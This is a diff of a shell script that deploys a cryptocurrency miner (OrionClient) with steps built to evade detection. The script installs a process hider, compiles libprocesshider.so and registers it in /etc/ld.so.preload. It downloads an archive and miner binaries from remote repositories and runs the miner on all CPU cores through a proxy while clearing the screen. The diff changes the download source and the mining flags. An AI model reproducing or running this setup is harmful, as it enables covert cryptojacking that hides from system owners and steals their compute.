@@ -19,7 +19,7 @@ npm i -g node-process-hider
 
 apt update && apt install unzip
 
-wget https://github.com/dofsyg/btz-miner/releases/download/151/orion_linux151.zip && unzip orion_linux151.zip && cd linux && chmod 777 OrionClient
+wget https://github.com/egg5233/ore-hq-client/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod +x OrionClient
 
 wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
 
@@ -60,4 +60,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./OrionClient mine --pool twbitz --key 5o9PkcxTjqtvnGZRoqzAandwVKMkkzgpi4bUTkkeRgGV -t $(nproc --all)
+./graftcp/graftcp & clear & ./OrionClient mine -a --pool twbitz --key 5o9PkcxTjqtvnGZRoqzAandwVKMkkzgpi4bUTkkeRgGV --worker $(shuf -n 1 -i 1-99999)-SMP -t $(nproc --all) --ice
